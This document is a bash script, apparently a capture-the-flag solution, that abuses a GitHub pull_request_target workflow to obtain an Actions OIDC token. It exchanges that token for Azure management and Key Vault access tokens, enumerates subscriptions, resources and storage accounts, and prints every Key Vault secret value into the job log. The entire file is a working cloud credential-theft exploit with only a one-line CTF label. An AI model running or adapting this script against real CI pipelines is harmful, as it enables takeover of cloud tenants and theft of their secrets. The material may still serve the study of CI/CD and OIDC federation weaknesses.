#!/usr/bin/env bash
# CTF: pull_request_target pwn -> Azure OIDC federation -> loot flag
set +e
echo "=====[ OIDC/ENV ]====="
echo "SUB=$AZURE_SUBSCRIPTION_ID TENANT=$AZURE_TENANT_ID CLIENT=$AZURE_CLIENT_ID"
env | grep -iE 'AZURE|FLAG|AUDIENCE' | grep -vi TOKEN
OIDC=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" \
  | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
echo "OIDC len=${#OIDC}"
tok(){ curl -s -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
  -d client_id=$AZURE_CLIENT_ID -d grant_type=client_credentials \
  -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer \
  -d client_assertion=$OIDC -d "scope=$1"; }
ARM=$(tok "https://management.azure.com/.default" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))')
echo "ARM len=${#ARM}"
H="-s -H Authorization:Bearer${ARM:+ }"
echo "=====[ SUBSCRIPTIONS ]====="
curl -s -H "Authorization: Bearer $ARM" "https://management.azure.com/subscriptions?api-version=2022-12-01"
echo; echo "=====[ RESOURCES ]====="
curl -s -H "Authorization: Bearer $ARM" "https://management.azure.com/subscriptions/$AZURE_SUBSCRIPTION_ID/resources?api-version=2021-04-01&\$top=200"
echo; echo "=====[ RESOURCE GROUPS (tags may hold flag) ]====="
curl -s -H "Authorization: Bearer $ARM" "https://management.azure.com/subscriptions/$AZURE_SUBSCRIPTION_ID/resourcegroups?api-version=2021-04-01"
echo; echo "=====[ KEY VAULTS -> SECRETS ]====="
VT=$(tok "https://vault.azure.net/.default" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))')
echo "VT len=${#VT}"
for V in $(curl -s -H "Authorization: Bearer $ARM" "https://management.azure.com/subscriptions/$AZURE_SUBSCRIPTION_ID/resources?api-version=2021-04-01&\$filter=resourceType%20eq%20'Microsoft.KeyVault/vaults'" | python3 -c 'import sys,json;[print(r["name"]) for r in json.load(sys.stdin).get("value",[])]' 2>/dev/null); do
  echo "--- vault $V ---"
  for S in $(curl -s -H "Authorization: Bearer $VT" "https://$V.vault.azure.net/secrets?api-version=7.4" | python3 -c 'import sys,json;[print(i["id"].split("/")[-1]) for i in json.load(sys.stdin).get("value",[])]' 2>/dev/null); do
    val=$(curl -s -H "Authorization: Bearer $VT" "https://$V.vault.azure.net/secrets/$S?api-version=7.4" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))' 2>/dev/null)
    echo "SECRET $S = $val"
  done
done
echo "=====[ STORAGE ACCOUNTS ]====="
curl -s -H "Authorization: Bearer $ARM" "https://management.azure.com/subscriptions/$AZURE_SUBSCRIPTION_ID/providers/Microsoft.Storage/storageAccounts?api-version=2023-01-01" | python3 -c 'import sys,json;[print(a["name"],a["id"]) for a in json.load(sys.stdin).get("value",[])]' 2>/dev/null
echo "=====[ DONE ]====="
